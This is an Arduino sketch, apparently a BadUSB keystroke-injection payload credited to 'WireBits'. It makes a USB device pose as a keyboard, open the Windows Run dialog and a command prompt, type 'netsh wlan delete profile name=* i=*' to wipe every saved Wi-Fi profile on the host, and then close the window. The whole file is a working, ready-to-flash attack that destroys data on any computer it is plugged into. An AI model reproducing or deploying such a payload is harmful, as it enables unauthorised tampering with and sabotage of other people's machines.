/*
 * Delete Wifi Profiles
 * It delete all saved wifi from your PC/Laptop.
 * Author - WireBits
 */
 
#include<Keyboard.h>
void setup()
{
 Keyboard.begin();
 delay(1000);
 Keyboard.press(KEY_LEFT_GUI);
 Keyboard.press('r');
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.print("cmd");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.print("netsh wlan delete profile name=* i=*");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1200);
 Keyboard.print("exit");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 Keyboard.end();
}
void loop()
{
 //Nothing to do here ;)
}
